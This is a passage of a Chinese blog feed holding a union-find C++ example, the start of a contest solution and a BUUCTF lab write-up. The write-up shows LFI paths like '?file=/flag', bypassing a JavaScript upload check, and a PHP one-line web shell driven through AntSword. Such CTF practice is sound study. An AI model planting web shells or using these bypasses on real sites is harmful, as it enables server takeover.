class="built_in">print</span>(<span class="string">&quot;%d %d&quot;</span>%(p, q))</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test-3"><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">union_find</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="keyword">int</span>* id;</span><br><span class="line"><span class="keyword">int</span>* sz;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">union_find</span>(<span class="keyword">int</span> N) &#123;</span><br><span class="line">id = <span class="keyword">new</span> <span class="keyword">int</span>[N];</span><br><span class="line">sz = <span class="keyword">new</span> <span class="keyword">int</span>[N];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">id[i] = i;</span><br><span class="line">sz[i] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">~<span class="built_in">union_find</span>()&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">connected</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">find</span>(p) == <span class="built_in">find</span>(q);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> p)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> tmp = p;</span><br><span class="line"><span class="keyword">while</span> (p != id[p]) p = id[p];</span><br><span class="line"><span class="keyword">while</span> (tmp != id[tmp]) &#123;</span><br><span class="line"><span class="keyword">int</span> t = tmp;</span><br><span class="line">tmp = id[tmp];</span><br><span class="line">id[t] = p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Union</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// c++ 中 union 为共用体关键字</span></span><br><span class="line">        <span class="keyword">int</span> pR = <span class="built_in">find</span>(p);</span><br><span class="line">        <span class="keyword">int</span> qR = <span class="built_in">find</span>(q);</span><br><span class="line">        <span class="keyword">if</span> (pR == qR)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span> (sz[pR] &lt; sz[qR]) &#123;</span><br><span class="line">            id[pR] = qR;</span><br><span class="line">            sz[qR] += sz[pR];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            id[qR] = pR;</span><br><span class="line">            sz[pR] += sz[qR];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">ifstream fin;</span><br><span class="line">fin.<span class="built_in">open</span>(<span class="string">&quot;demo.txt&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> N;</span><br><span class="line">fin &gt;&gt; N;</span><br><span class="line">union_find* uf = <span class="keyword">new</span> <span class="built_in">union_find</span>(N);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> p, q;</span><br><span class="line"><span class="keyword">while</span> (fin &gt;&gt; p) &#123;</span><br><span class="line">fin &gt;&gt; q;</span><br><span class="line"><span class="keyword">if</span> (uf-&gt;<span class="built_in">connected</span>(p, q)) <span class="keyword">continue</span>;</span><br><span class="line">uf-&gt;<span class="built_in">Union</span>(p, q);</span><br><span class="line">cout &lt;&lt; p &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; q &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">fin.<span class="built_in">close</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="参考文献">参考文献</h2><cite>[1]Robert Sedgewick&#44;Kevin Wayne&#46;算法:第4版[M].谢路云&#44;译&#46;北京:人民邮电出版社&#44;2012:136-149&#46;<br/>[2]中国国家标准化管理委员会&#46;信息与文献 参考文献著录规则:GB/T 7714—2015[S]&#46;北京:中华人民共和国国家质量监督检验检疫总局&#44;2015&#46;<br/>[3]Bruce Eckel&#46;Java编程思想:第4版[M]&#46;陈昊鹏&#44;译&#46;北京:机械工业出版社&#44;2007&#46;<br/>[4]Stephen Prata&#46;C++ Primer Plus（第6版）中文版[M]&#46;张海龙&#44;袁国忠&#44;译&#46;北京:人民邮电出版社&#44;2020&#46;</cite>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 并查集 </tag>
            
            <tag> union-find </tag>
            
            <tag> 动态连通性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF 刷题笔记——Basic 1</title>
      <link href="/posts/3989fe45/"/>
      <url>/posts/3989fe45/</url>
      
        <content type="html"><![CDATA[<h1>BUUCTF 刷题笔记——Basic 1</h1><h2 id="Linux-Labs">Linux Labs</h2><h3 id="启动靶机">启动靶机</h3><ul><li><p>打开链接，只有如图的清爽页面</p><img src="0001.webp" alt="" style="zoom: 65%;" /><p>过于清爽初来乍到的小白显然不知从何入手……并且页面中的按钮也不过是摆设。</p></li></ul><h3 id="ssh-连接">ssh 连接</h3><ul><li><p>其实题目本身已经说明，要进行 ssh 远程连接。</p><img src="0002.webp" alt="" style="zoom: 65%;" /></li><li><p>虽然题目名显示需要 Linux ，但只是 ssh 的话，显然在 Windows 的命令行直接操作即可。</p></li><li><p>在 CMD 中输入以下命令发起连接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -p [端口号] [用户名]@[地址]</span><br></pre></td></tr></table></figure><img src="0003.webp" alt="" style="zoom: 65%;" /></li><li><p>第一次连接会有如下提示，键入 yes 后回车，再输入密码即可连接成功。</p><img src="0004.webp" alt="" style="zoom: 65%;" /></li></ul><h3 id="文件查找">文件查找</h3><ul><li><p>既然已经连接上了，那就可以看看有哪些文件了，先输入 <code>ls</code> 查看当前文件夹的内容。</p><img src="0005.webp" alt="" style="zoom: 65%;" /></li><li><p>很遗憾，是个空文件夹。那么继续查找，当前目录为 <code>~</code> ，所以这里访问上一层目录即访问根目录。输入命令 <code>cd ..</code> 再 <code>ls</code> 查看内容。</p><img src="0006.webp" alt="" style="zoom: 65%;" /></li><li><p>注意到关键词 <code>flag</code> ，大概率访问这个文件即可。输入命令 <code>cat flag.txt</code> 打开文件。</p><img src="0007.webp" alt="" style="zoom: 65%;" /></li><li><p>到手！</p></li></ul><h2 id="BUU-LFI-COURSE-1">BUU LFI COURSE 1</h2><h3 id="启动靶机-2">启动靶机</h3><ul><li><p>打开页面为一段代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: jinzhao</span><br><span class="line"> * Date: 2019/7/9</span><br><span class="line"> * Time: 7:07 AM</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">    $str = $_GET[&#x27;file&#x27;];</span><br><span class="line"></span><br><span class="line">    include $_GET[&#x27;file&#x27;];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="代码审计">代码审计</h3><ul><li><p>熟悉的 PHP 代码，不难看出只要将变量名为 <code>file</code> 的文件路径包含进去就能打开可能是我们需要的文件。那么我们需要的文件叫什么呢？有没有一种可能，他叫 <code>flag</code> ，假设假设成立，接下来验证一下。在 url 后加上 <code>/?file=flag</code> 回车。</p><img src="0008.webp" alt="" style="zoom: 65%;" /></li><li><p>很遗憾，这里并没有这个文件，根据提示可以看出共有三级目录，那么我们可以逐一查看一下其他文件夹，可以使用 <code>../</code> 查找上一级目录，或直接使用 <code>/</code> 查找根目录。在 url 后加上 <code>/?file=/flag</code> 回车。</p><img src="0009.webp" alt="" style="zoom: 65%;" /></li><li><p>因此不难发现，答案就在根目录的名为 flag 的文件中。所以不仅可以使用 <code>/?file=/flag</code> ，也可以使用 <code>/?file=../../../flag</code> 。那显然还是直接访问根目录比较优雅。</p></li></ul><h2 id="Upload-Labs-Linux">Upload-Labs-Linux</h2><h3 id="启动靶机-3">启动靶机</h3><ul><li><p>打开网页，终于不再像前面两个题一样草率，页面还是挺好看的，虽然这并不重要。</p><img src="0010.webp" alt="" style="zoom: 65%;" /></li><li><p>对着这个网页一通研究，好吧，是个硬茬。</p></li></ul><h3 id="研究页面">研究页面</h3><ul><li><p>既然有上传图片的功能，那就上传一张看看。</p><img src="0011.webp" alt="" style="zoom: 65%;" /></li><li><p>一切正常，根据图片 url 可以看出文件被上传至网页目录的 <code>upload</code> 目录下。</p><img src="0012.webp" alt="" style="zoom: 65%;" /></li><li><p>再上传一个其他文件看看，被阻止了，说是只支持 <code>jpg/png/gif</code> 三种文件，老实说不支持 <code>webp</code> 我不是很认可。</p><img src="0013.webp" alt="" style="zoom: 65%;" /></li><li><p>也就是说，我们只能上传这三种文件，想通过上传我们的木马武装夺旗，就只能想办法突破这种限制。作为小白，理所应当地查看提示：</p><img src="0014.webp" alt="" style="zoom: 65%;" /></li><li><p>使用 js 检查可还行，意味着检查在前端完成，而前端完全可以由我们自行操作！</p></li></ul><h3 id="突破限制">突破限制</h3><ul><li><p>这里可以先创建好一个文件，先编写好所谓的“一句话木马”。</p><blockquote><p><strong>一句话木马</strong></p><p>将仅含一行代码的程序文件上传至目标网站，如 PHP 代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;h-t-m&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>@</code> 表示其后代码即使出错也将不会报错。</li><li><code>eval()</code> 函数表示将参数当作代码来执行。</li><li><code>$_POST[]</code> 表示以 post 方式获取变量。</li></ul><p>也就是说，我们将文件上传之后，即可用对应方法向网站提交代码并执行，这里使用 post 方法。虽然我们直接定义了自己的变量名 <code>h-t-m</code> ，但是 <code>@</code> 可以保证不会报错。于是我们完全可以通过这个文件直接连接至服务器。</p></blockquote></li><li><p>由于只是  js 检查，为表示对检查的尊重，我们大可以嚣张一点，将文件名命名为 <code>木马.php</code> 。</p><img src="0015.webp" alt="" style="zoom: 65%;" /></li><li><p>突破前端检查，可以直接修改对应的 js 代码，也可以直接在浏览器禁用 JavaScript ，或者直接删除 HTML 中对检查代码的调用。</p><p><strong>以下三种方法任选其一即可</strong></p><ul><li><p>修改 js 代码需要在控制台重构函数，直接原地修改无效。查看语句找到该检查函数如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">        <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">        <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">        <span class="comment">//提取上传文件的类型</span></span><br><span class="line">        <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">        <span class="keyword">if</span> (allow_ext.indexOf(ext_name) == -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">            alert(errMsg);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出，文件类型的限定语句为 <code>var allow_ext = &quot;.jpg|.png|.gif&quot;;</code> 那么只要将我们要上传的文件的后缀名加入，并在控制台中执行即可：</p><img src="0017.webp" alt="" style="zoom: 65%;" /></li><li><p>禁用 JavaScript ：右键——检查——设置——禁用即可</p><img src="0024.webp" alt="" style="zoom: 65%;" /></li><li><p>删除 HTML 中代码即删除如图语句即可</p><img src="0016.webp" alt="" style="zoom: 65%;" /></li></ul></li><li><p>解除限制之后，便可以将文件上传了</p><img src="0018.webp" alt="" style="zoom: 65%;" /></li><li><p>刚开始对页面研究时我们得知，文件是直接上传至网页所在目录的 <code>upload</code> 目录下的，因此可以得知我们上传的文件的 url 为 <code>http://靶机地址/upload/木马.php</code> ，当然也可以在上传页直接查看文件地址。</p></li></ul><h3 id="入侵">入侵</h3><ul><li><p>上传好木马后，就该使用工具进入整个后台服务器了。中国蚁剑既可以完成这个任务，配置安装入门可参考官方 <a href="https://github.com/AntSwordProject/antSword/blob/master/README_CN.md">中文文档</a> 。打开软件添加连接：</p><img src="0019.webp" alt="" style="zoom: 65%;" /></li><li><p>注意到，这里需要输入密码，那么密码是什么呢？在前面输入的一句话代码中， <code>&lt;?php @eval($_POST[&quot;h-t-m&quot;]);?&gt;</code> ，我们将通过 post 方法将内容传输至 <code>h-t-m</code> 变量中而实现入侵，而这个变量就是进入服务器所需要的连接密码。因此，输入变量名即可。</p><img src="0020.webp" alt="" style="zoom: 65%;" /></li><li><p>添加成功后双击连接即可进入木马文件所在目录，右边同样可以看到目录列表，因此现在我们已经拥有了网站所有的文件了，并且可以进行任意增删改查！</p><img src="0021.webp" alt="" style="zoom: 65%;" /></li></ul><h3 id="寻找-flag">寻找 flag</h3><ul><li><p>既然已经获得所有权了，那就可以慢慢找了。不过，目前的经验表明，flag 一般会放在根目录，因此首先查看根目录，果不其然：</p><img src="0022.webp" alt="" style="zoom: 65%;" /></li><li><p>都到这一步了，就双击打开吧！</p><img src="0023.webp" alt="" style="zoom: 65%;" /></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUCTF </tag>
            
            <tag> Linux </tag>
            
            <tag> SSH </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> 文件包含 </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>武工大2022蓝桥杯预选赛题解复现</title>
      <link href="/posts/e8fc5ea4/"/>
      <url>/posts/e8fc5ea4/</url>
      
        <content type="html"><![CDATA[<h1>武工大2022蓝桥杯预选赛题解复现</h1><blockquote><p>第一次参加编程类的比赛，不懂规矩，没有任何技巧，赛场也犯了很多错误，但想去学习的心是非常真切的。时限内仅完成两道题目，趁学校公布了题解抓紧照猫画虎复现一遍，也顺便正式入门。</p></blockquote><h2 id="A-还原">A. 还原</h2><h3 id="题目描述">题目描述</h3><p>寒假期间，痛恨英语的阿祥终于妥协了，他决定重新开始学习英语。但阿祥的英语实在是太差了，他得从最基础的数字开始复习。单纯的背单词也太无聊了吧，你说是不是？所以阿祥花了半天时间用<strong>小写英文</strong>（zero~nine，add, sub)写了一个超级长的英文加减法算式（当然，垃圾的阿祥不会写大于10的英文数字，全是逐字符翻译的，每个单词都用一个空格隔开），完成后他觉得非常有成就感，hh！！！</p><p>过年那天，阿祥家来了一个小屁孩，他趁阿祥上厕所的时候闯进阿祥的房间乱搞了一通。等阿祥回来的时候，他写的英文加减法算式已经面目全非了，他非常生气（_/）…。快气哭的阿祥突然发现，电脑的大写锁定一直开着，并且小屁孩保证没有删除任何一个字符，也没有按多余的空格，也就是说算式是有希望复原的。上厕所并没有让阿祥变成战神，希望你能帮他写一个复原程序，并求出算式的最终结果。（别问为啥不备份、不 Ctrl+z，他就是不会）。</p><p>注：zero、one、two、three、four、five、six、seven、eight、nine。加add，减sub。</p><h3 id="输入描述">输入描述:</h3><p>一行字符串 $$s(1 ≤ len(s) &lt; 50000)$$ ，包含除回车之外的字符，以回车结尾。（保证数字和结果在int范围内，空格隔开的子串会且只会包含一个合法单词）。</p><h3 id="输出描述">输出描述:</h3><p>第一行：还原的英文加减法算式（每个单词间用空格隔开）</p><p>第二行：一个整数，表示加减法算式的结果</p><h3 id="题解复现">题解复现</h3><blockquote><ol><li><p>字符串到数字的转换由 map 容器完成。</p></li><li><p>是否为小写字母由 islower() 函数判断。</p></li><li><p>直接使用 string 类型字符串且善用加减运算。</p></li><li><p>单行代码还是不打花括号好看。</p></li><li><p>#include&lt;bits/stdc++.h&gt;</p><p>ios::sync_with_stdio(false);</p><p>cin.tie(0);</p><p>这三句貌似打比赛常用，貌似。</p></li></ol></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span>     <span class="comment">//万能头文件，费时但好用</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);   <span class="comment">//不向C语言兼容，加速用</span></span><br><span class="line">cin.<span class="built_in">tie</span>(<span class="number">0</span>);                    <span class="comment">//io不绑定，加速用</span></span><br><span class="line">map&lt;string, <span class="keyword">int</span>&gt; num;</span><br><span class="line">num[<span class="string">&quot;one&quot;</span>] = <span class="number">1</span>; num[<span class="string">&quot;two&quot;</span>] = <span class="number">2</span>; num[<span class="string">&quot;three&quot;</span>] = <span class="number">3</span>; num[<span class="string">&quot;four&quot;</span>] = <span class="number">4</span>; num[<span class="string">&quot;five&quot;</span>] = <span class="number">5</span>;</span><br><span class="line">num[<span class="string">&quot;six&quot;</span>] = <span class="number">6</span>; num[<span class="string">&quot;seven&quot;</span>] = <span class="number">7</span>; num[<span class="string">&quot;eight&quot;</span>] = <span class="number">8</span>; num[<span class="string">&quot;nine&quot;</span>] = <span class="number">9</span>; num[<span class="string">&quot;zero&quot;</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">string s;</span><br><span class="line">vector&lt;string&gt; vs;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (cin &gt;&gt; s) &#123;</span><br><span class="line">string s2 = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> ch : s) <span class="keyword">if</span> (<span class="built_in">islower</span>(ch)) s2 += ch;</span><br><span class="line">vs.<span class="built_in">push_back</span>(s2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> x = <span class="number">1</span>, nmb = <span class="number">0</span>, sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> &amp;s0 : vs) &#123;</span><br><span class="line">cout &lt;&lt; s0 &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (s0 != <span class="string">&quot;add&quot;</span> &amp;&amp; s0 != <span class="string">&quot;sub&quot;</span>) nmb = nmb * <span class="number">10</span> + num[s0];</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">sum += nmb * x;</span><br><span class="line">nmb = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (s0 == <span class="string">&quot;add&quot;</span>) x = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> x = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (nmb != <span class="number">0</span>) sum += nmb * x;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;\n&quot;</span> &lt;&lt; sum;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-接雨水">B. 接雨水</h2><h3 id="题目描述-2">题目描述</h3><p>地上有一个 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 行 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 列的方格，每一个方格里面有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 个单位体积的雨水，横坐标的范围是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>−</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">1−n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ，纵坐标的范围是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>−</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">1−m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> ;<br>现在你在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>1</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(1,1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span> 点开始接雨水（无论 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>1</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(1,1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span> 这一点符不符合要求，这一个格子的雨水一定会被你接到），每次只能向上下左右方向移动一格。你只能移动到横坐标与纵坐标的数位之和在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><msub><mi>k</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>k</mi><mn>2</mn></msub><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[k_1,k_2]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span> 之间的格子然后接到里面的雨水。<br>请问你最多接到多少单位体积的雨水?<br>例： <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>123</mn><mo separator="true">,</mo><mn>456</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(123,456)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span 